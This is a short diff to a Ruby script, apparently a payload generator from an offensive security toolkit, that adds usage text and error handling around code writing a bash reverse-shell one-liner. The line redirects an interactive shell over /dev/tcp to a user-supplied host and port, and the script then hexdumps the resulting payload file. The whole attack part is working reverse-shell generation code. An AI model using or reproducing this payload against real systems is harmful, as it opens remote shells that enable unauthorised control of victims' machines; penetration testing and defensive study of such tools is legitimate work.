@@ -39,10 +39,25 @@ host = options.local_host
 port = options.local_port
 shell = options.target_shell
 
-sleep(0.5)
-open('payload.sh', 'w') { |f|
-    f.puts "#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &"
-}
-puts "#{h}Output raw:"
-system("hexdump payload.sh")
-system("rm payload.sh")
+if host == "" or port == "" or shell == ""
+    puts "Usage: raw.rb --local-host=<local_host> --local-port=<local_port>"
+    puts "              --target-shell=<target_shell>"
+    puts ""
+    puts "  --local-host=<local_host>      Local host."
+    puts "  --local-port=<local_port>      Local port."
+    puts "  --target-shell=<target_shell>  Target shell."
+end
+  
+begin
+    sleep(0.5)
+    puts "#{g}Writing payload..."
+    sleep(1)
+    open('payload.sh', 'w') { |f|
+        f.puts "#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &"
+    }
+    puts "#{h}Output raw:"
+    system("hexdump payload.sh")
+    system("rm payload.sh")
+rescue
+    puts "#{e}Failed to write payload!"
+end
